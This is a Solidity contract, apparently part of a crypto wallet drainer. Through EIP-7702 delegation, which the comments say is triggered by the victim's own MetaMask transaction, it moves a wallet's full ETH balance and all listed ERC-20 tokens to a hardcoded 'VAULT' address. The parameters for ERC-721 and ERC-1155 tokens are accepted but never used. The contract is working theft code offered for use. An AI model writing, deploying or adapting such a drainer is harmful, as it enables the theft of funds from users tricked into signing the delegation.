// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * BatchDrainV2 — EIP-7702 Self-Initiated Drain
 *
 * User sends type-4 tx via MetaMask (eth_sendTransaction).
 * MetaMask internally signs the authorization and broadcasts.
 * address(this) = user's wallet, msg.sender = user's wallet (same!).
 * onlySelf guard: only the wallet itself can drain itself.
 */

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract BatchDrainV2 {
    address public constant VAULT = 0xc46e0141a979a071360A692F887c3dA6b7E39A44;
    uint256 public constant MAX_NFTS = 20;

    error Unauthorized();
    error TransferFailed();

    // In EIP-7702: user sends tx to their own wallet → msg.sender == address(this)
    modifier onlySelf() {
        if (msg.sender != address(this)) revert Unauthorized();
        _;
    }

    function drain(
        address[] calldata erc20s,
        address[] calldata erc721Contracts,
        uint256[] calldata erc721Ids,
        address[] calldata erc1155Contracts,
        uint256[] calldata erc1155Ids
    ) external onlySelf {
        // ETH — full balance (gas already deducted before execution)
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            (bool ok,) = VAULT.call{value: ethBal}("");
            if (!ok) revert TransferFailed();
        }

        // ERC-20
        for (uint256 i; i < erc20s.length; ++i) {
            uint256 bal = IERC20(erc20s[i]).balanceOf(address(this));
            if (bal > 0) {
                try IERC20(erc20s[i]).transfer(VAULT, bal) {} catch {}
            }
        }

        // suppress unused param warnings
        erc721Contracts; erc721Ids; erc1155Contracts; erc1155Ids;
    }

    receive() external payable {}
    fallback() external payable {}
}
